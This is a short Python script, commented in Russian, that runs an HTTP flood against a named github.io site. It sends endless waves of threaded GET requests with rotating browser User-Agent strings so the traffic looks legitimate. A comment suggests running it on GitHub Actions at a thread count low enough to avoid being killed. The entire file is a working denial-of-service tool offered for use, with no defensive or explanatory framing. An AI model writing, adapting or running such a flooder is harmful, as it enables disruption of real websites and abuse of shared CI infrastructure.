import requests
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
import random

# Целевой сайт
TARGET = "https://srabakio.github.io/"

# Разные User-Agent, чтобы выглядеть как обычные браузеры
UA_LIST = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0"
]

def attack():
    """Отправляет один запрос к сайту."""
    headers = {
        'User-Agent': random.choice(UA_LIST),
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Connection': 'keep-alive'
    }
    try:
        # Отправляем GET запрос. Таймаут маленький, чтобы не висеть долго.
        requests.get(TARGET, headers=headers, timeout=2)
    except:
        pass

def main():
    print(f"[+] Начинаем атаку на {TARGET}")
    
    # Количество потоков. 
    # Для GitHub Actions лучше ставить 10-20, иначе процесс убьют за потребление CPU.
    NUM_THREADS = 15 
    
    while True:
        with ThreadPoolExecutor(max_workers=NUM_THREADS) as executor:
            futures = []
            for _ in range(NUM_THREADS):
                futures.append(executor.submit(attack))
            
            # Ждем завершения всех потоков перед следующим циклом
            for future in as_completed(futures):
                pass
            
            # Пауза между волнами атак (в секундах)
            time.sleep(1) 

if __name__ == "__main__":
    main()